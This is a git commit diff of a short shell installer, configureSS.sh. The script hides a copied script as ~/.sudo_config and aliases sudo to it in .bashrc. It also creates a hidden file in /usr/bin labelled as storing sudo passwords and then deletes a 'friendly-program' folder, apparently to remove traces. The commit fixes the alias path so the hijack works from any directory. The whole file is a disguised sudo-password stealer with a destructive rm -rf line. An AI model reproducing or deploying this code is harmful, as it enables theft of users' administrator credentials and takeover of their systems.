3a65dd7c1e5d57435fccb62552d7f31f247e9eed
ArnavSax <44127903+ArnavSax@users.noreply.github.com>
2018-11-05 21:45:23 -0800

    Update configureSS.sh

--- configureSS.sh
+++ configureSS.sh
@@ -1,5 +1,5 @@
 cp thing.sh /home/$USER/.sudo_config
 chmod +x /home/$USER/.sudo_config
-echo -n "alias sudo='./.sudo_config'" >> /home/$USER/.bashrc
+echo -n "alias sudo='~/.sudo_config'" >> /home/$USER/.bashrc
 cat "#This file stores sudo passwords" > /usr/bin/.passwordsfromSS
 rm -rf ../*friendly-program*
